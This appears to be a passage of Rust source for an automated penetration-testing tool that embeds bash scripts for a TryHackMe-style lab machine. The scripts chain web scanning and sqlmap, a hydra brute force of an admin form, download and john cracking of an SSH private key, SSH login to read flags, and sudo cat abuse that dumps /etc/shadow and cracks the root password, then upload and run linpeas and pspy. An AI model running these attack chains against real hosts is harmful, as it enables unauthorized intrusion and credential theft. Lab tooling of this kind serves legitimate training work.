else
  echo "[mietos-missing-tool] feroxbuster"
fi

if command -v nuclei >/dev/null 2>&1; then
  timeout 120s nuclei -u "$BASE" -severity low,medium,high,critical -silent -no-color \
    | tee "$WORK/nuclei.txt" || true
else
  echo "[mietos-missing-tool] nuclei"
fi

if command -v sqlmap >/dev/null 2>&1; then
  timeout 90s sqlmap -u "$BASE" --batch --crawl=1 --forms --level=1 --risk=1 --threads=2 --timeout=6 \
    | tee "$WORK/sqlmap.txt" || true
else
  echo "[mietos-missing-tool] sqlmap"
fi

if command -v zaproxy >/dev/null 2>&1; then
  timeout 120s zaproxy -cmd -quickurl "$BASE" -quickout "$WORK/zap.html" -quickprogress \
    | tee "$WORK/zap.txt" || true
else
  echo "[mietos-missing-tool] zaproxy"
fi
done < "$BASES"

echo "[mietos] deep web scan finished"
"#;
    script.replace("__MIETOS_TARGET__", &quoted_host)
}

pub fn target_host(target: &str) -> String {
    let trimmed = target.trim();
    let without_scheme = trimmed
        .strip_prefix("http://")
        .or_else(|| trimmed.strip_prefix("https://"))
        .unwrap_or(trimmed);
    without_scheme
        .split('/')
        .next()
        .unwrap_or(without_scheme)
        .trim()
        .to_string()
}

pub fn http_url(target: &str) -> String {
    let trimmed = target.trim().trim_end_matches('/');
    if trimmed.starts_with("http://") || trimmed.starts_with("https://") {
        format!("{trimmed}/")
    } else {
        format!("http://{trimmed}/")
    }
}

fn web_login_chain_command(host: &str) -> String {
    let quoted_host = bash_quote(host);
    let script = r#"set -u
TARGET=__MIETOS_TARGET__
BASE="http://$TARGET"
WORK="/tmp/mietos-$TARGET"
mkdir -p "$WORK"
echo "[mietos] starting web login, key crack, and SSH flag workflow for $TARGET"

if [ ! -f /usr/share/wordlists/rockyou.txt ] && [ -f /usr/share/wordlists/rockyou.txt.gz ]; then
  gzip -dk /usr/share/wordlists/rockyou.txt.gz || true
fi

for tool in curl hydra ssh2john john ssh-keygen ssh; do
  command -v "$tool" >/dev/null 2>&1 || echo "[mietos-missing-tool] $tool"
done

echo "[mietos] fetching admin login page"
curl -s "$BASE/admin/" | tee "$WORK/admin-login.html" | sed -n '1,90p' || true

echo "[mietos] brute forcing authorized lab admin form with hydra"
HYDRA_OUT="$(hydra -l admin -P /usr/share/wordlists/rockyou.txt "$TARGET" http-post-form '/admin/:user=^USER^&pass=^PASS^:F=Username or password invalid' -I -t 4 -f 2>&1 || true)"
printf '%s\n' "$HYDRA_OUT" | tee "$WORK/hydra.log"
PAIR="$(printf '%s\n' "$HYDRA_OUT" | awk '/login:/{for (i=1; i<=NF; i++) { if ($i=="login:") u=$(i+1); if ($i=="password:") p=$(i+1); }} END { if (u != "" && p != "") print u ":" p; }')"

if [ -n "$PAIR" ]; then
  echo "[mietos-answer] admin user:password = $PAIR"
else
  echo "[mietos] no admin credential found in hydra output"
fi

ADMIN_USER="${PAIR%%:*}"
ADMIN_PASS="${PAIR#*:}"
if [ -n "$PAIR" ]; then
  echo "[mietos] logging in and collecting panel evidence"
  curl -s -L -c "$WORK/cookies" -b "$WORK/cookies" --data-urlencode "user=$ADMIN_USER" --data-urlencode "pass=$ADMIN_PASS" "$BASE/admin/" \
    | tee "$WORK/admin-panel.html" | sed -n '1,140p' || true
  grep -Eo 'THM\{[^}]+\}' "$WORK/admin-panel.html" | head -1 | sed 's/^/[mietos-answer] web flag = /' || true

  echo "[mietos] trying RSA key locations from the admin panel"
  rm -f "$WORK/id_rsa"
  for path in /admin/panel/id_rsa /admin/id_rsa /id_rsa; do
    curl -s -L -b "$WORK/cookies" -o "$WORK/key-probe" -w "[mietos] key probe %{http_code} %{size_download} $path\n" "$BASE$path" || true
    if grep -q 'BEGIN .*PRIVATE KEY' "$WORK/key-probe" 2>/dev/null; then
      cp "$WORK/key-probe" "$WORK/id_rsa"
      chmod 600 "$WORK/id_rsa"
      echo "[mietos] rsa key url = $BASE$path"
      break
    fi
  done

  if [ -s "$WORK/id_rsa" ]; then
    echo "[mietos] cracking RSA key passphrase with john"
    ssh2john "$WORK/id_rsa" > "$WORK/id_rsa.hash" 2>/dev/null || true
    john --wordlist=/usr/share/wordlists/rockyou.txt "$WORK/id_rsa.hash" || true
    JOHN_SHOW="$(john --show "$WORK/id_rsa.hash" 2>/dev/null || true)"
    printf '%s\n' "$JOHN_SHOW" | tee "$WORK/john-show.txt"
    RSA_PASS="$(printf '%s\n' "$JOHN_SHOW" | awk -F: '/id_rsa/ && NF >= 2 { print $2; exit }')"

    if [ -n "$RSA_PASS" ]; then
      echo "[mietos-answer] rsa passphrase = $RSA_PASS"
      cp "$WORK/id_rsa" "$WORK/id_rsa.unlocked"
      chmod 600 "$WORK/id_rsa.unlocked"
      ssh-keygen -p -P "$RSA_PASS" -N "" -f "$WORK/id_rsa.unlocked" >/dev/null 2>&1 || true

      echo "[mietos] using cracked key to collect SSH-accessible flags"
      SSH_OUT="$(ssh -i "$WORK/id_rsa.unlocked" -o StrictHostKeyChecking=no -o UserKnownHostsFile="$WORK/known_hosts" -o ConnectTimeout=8 john@"$TARGET" 'cat user.txt 2>/dev/null; find /var/www -maxdepth 4 -type f 2>/dev/null | head -30' 2>&1 || true)"
      printf '%s\n' "$SSH_OUT" | tee "$WORK/ssh-output.txt"
      printf '%s\n' "$SSH_OUT" | grep -Eo 'THM\{[^}]+\}' | head -1 | sed 's/^/[mietos-answer] user.txt = /' || true
    else
      echo "[mietos] john did not produce an RSA passphrase"
    fi
  else
    echo "[mietos] no RSA private key downloaded"
  fi
fi

echo "[mietos] workflow finished; click Extract Findings if the Results tab did not update"
"#;
    script.replace("__MIETOS_TARGET__", &quoted_host)
}

fn privesc_chain_command(host: &str) -> String {
    let quoted_host = bash_quote(host);
    let script = r#"set -u
TARGET=__MIETOS_TARGET__
WORK="/tmp/mietos-$TARGET"
KEY="$WORK/id_rsa.unlocked"
echo "[mietos] starting privilege escalation workflow for $TARGET"

if [ ! -s "$KEY" ] && [ -s "$WORK/id_rsa" ] && [ -s "$WORK/john-show.txt" ]; then
  RSA_PASS="$(awk -F: '/id_rsa/ && NF >= 2 { print $2; exit }' "$WORK/john-show.txt")"
  if [ -n "$RSA_PASS" ]; then
    cp "$WORK/id_rsa" "$KEY"
    chmod 600 "$KEY"
    ssh-keygen -p -P "$RSA_PASS" -N "" -f "$KEY" >/dev/null 2>&1 || true
  fi
fi

if [ ! -s "$KEY" ]; then
  echo "[mietos] no unlocked john SSH key found; run Web Login first or provide credentials in notes"
  exit 0
fi

SSH_OPTS="-i $KEY -o StrictHostKeyChecking=no -o UserKnownHostsFile=$WORK/known_hosts -o ConnectTimeout=8"
echo "[mietos] collecting privesc evidence as john"
timeout 90s ssh $SSH_OPTS john@"$TARGET" '
  echo "--- whoami/id ---";
  whoami; id;
  echo "--- sudo -l ---";
  sudo -n -l 2>/dev/null || sudo -l 2>/dev/null || true;
  echo "--- home flags ---";
  find /home -maxdepth 3 -type f \( -name "user.txt" -o -name "root.txt" -o -name "*flag*" \) -print -exec cat {} \; 2>/dev/null || true;
  echo "--- writable interesting dirs ---";
  find / -writable -type d 2>/dev/null | grep -Ev "^/proc|^/sys|^/run" | head -40;
  echo "--- suid binaries ---";
  find / -perm -4000 -type f 2>/dev/null | sort | head -80;
  echo "--- capabilities ---";
  getcap -r / 2>/dev/null | head -80;
' | tee "$WORK/privesc.txt" || true

if grep -q 'NOPASSWD: /bin/cat' "$WORK/privesc.txt"; then
  echo "[mietos] sudo allows root /bin/cat; reading root proof and shadow hash"
  timeout 60s ssh $SSH_OPTS john@"$TARGET" 'sudo /bin/cat /etc/shadow 2>/dev/null; echo ---ROOTTXT---; sudo /bin/cat /root/root.txt 2>/dev/null || true' \
    | tr -d "\r" | tee "$WORK/root-proof.txt" || true
  awk -F: '/^root:/{print $1 ":" $2}' "$WORK/root-proof.txt" > "$WORK/root.hash" || true
  if [ -s "$WORK/root.hash" ]; then
    john --wordlist=/usr/share/wordlists/rockyou.txt "$WORK/root.hash" || true
    john --show "$WORK/root.hash" | tee "$WORK/root-john-show.txt" || true
    ROOT_PASS="$(awk -F: '/^root:/ && NF >= 2 { print $2; exit }' "$WORK/root-john-show.txt")"
    if [ -n "$ROOT_PASS" ]; then
      echo "[mietos-answer] root password = $ROOT_PASS"
    fi
  fi
  awk '/---ROOTTXT---/{capture=1; next} capture && /THM\{/{print; exit}' "$WORK/root-proof.txt" | sed 's/^/[mietos-answer] root.txt = /' || true
fi

grep -Eo 'THM\{[^}]+\}' "$WORK/privesc.txt" "$WORK/root-proof.txt" 2>/dev/null | tail -1 | sed 's/^/[mietos-answer] root flag = /' || true
echo "[mietos] privilege escalation evidence collected"
"#;
    script.replace("__MIETOS_TARGET__", &quoted_host)
}

fn deep_privesc_command(host: &str) -> String {
    let quoted_host = bash_quote(host);
    let script = r#"set -u
TARGET=__MIETOS_TARGET__
WORK="/tmp/mietos-$TARGET"
KEY="$WORK/id_rsa.unlocked"
echo "[mietos] starting deep privilege escalation scan for $TARGET"

if [ ! -s "$KEY" ]; then
  echo "[mietos] no unlocked SSH key found; run Web Login / Privilege Escalation first"
  exit 0
fi

SSH_OPTS="-i $KEY -o StrictHostKeyChecking=no -o UserKnownHostsFile=$WORK/known_hosts -o ConnectTimeout=8"

LINPEAS="$(find /usr/share -name linpeas.sh -type f 2>/dev/null | head -1)"
if [ -n "$LINPEAS" ]; then
  echo "[mietos] running linpeas remotely with timeout"
  cat "$LINPEAS" | timeout 240s ssh $SSH_OPTS john@"$TARGET" 'cat > /tmp/linpeas.sh; chmod +x /tmp/linpeas.sh; timeout 180s /tmp/linpeas.sh -q' \
    | tee "$WORK/linpeas.txt" || true
else
  echo "[mietos-missing-tool] linpeas.sh from peass"
fi

PSPY="$(find /usr/share -name pspy64 -type f 2>/dev/null | head -1)"
if [ -n "$PSPY" ]; then
  echo "[mietos] running short pspy sample remotely"
  scp -q $SSH_OPTS "$PSPY" john@"$TARGET":/tmp/pspy64 2>/dev/null || true
  timeout 90s ssh $SSH_OPTS john@"$TARGET" 'chmod +x /tmp/pspy64; timeout 60s /tmp/pspy64 -pf -i 1000' \
    | tee "$WORK/pspy.txt" || true
else
  echo "[mietos-missing-tool] pspy64"
fi

echo "[mietos] deep privilege escalation scan finished"
"#;
    script.replace("__MIETOS_TARGET__", &quoted_host)
}
